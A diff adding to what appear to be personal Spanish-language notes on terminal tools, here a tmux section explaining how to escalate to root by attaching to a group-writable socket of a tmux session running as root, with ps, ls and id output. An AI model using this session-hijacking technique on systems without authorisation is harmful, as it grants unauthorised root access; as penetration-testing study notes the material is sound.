@@ -1416,6 +1416,44 @@ SHIFT + n # para buscar en orden inverso.
 > https://superuser.com/questions/231002/how-can-i-search-within-the-output-buffer-of-a-tmux-shell
 
 
+Para sacar la version de tmux usa
+
+```
+tmux -V
+```
+
+Existe una manera de escalar privilegios con tmux corriendo una sesion como root
+
+Si revisamos los procesos vemos un tmux ejecutandose como root. Si encuentras algo como esto:
+
+
+```
+user@box:/# ps -u root
+
+
+/usr/bin/tmux -S /.devs/dev_sess
+
+```
+
+Nos damos cuenta que hay una session de tmux corriendo con privilegios de root Checamos si se puede escribir en ese archivo
+
+```
+
+user@box:/# ls -la /.devs/dev_sess
+srw-rw---- 1 root usergroup
+
+```
+Como si poemos escribir pues podemos crear una sesion con priv de root. Entonces para se root solo has
+
+```
+user@box:/# tmux -S /.devs/dev_sess
+root@box:/# id
+uid=0(root) gid=0(root) groups=0(root)
+
+```
+
+> https://int0x33.medium.com/day-69-hijacking-tmux-sessions-2-priv-esc-f05893c4ded0
+
 ## Batcat
 
 ```bash
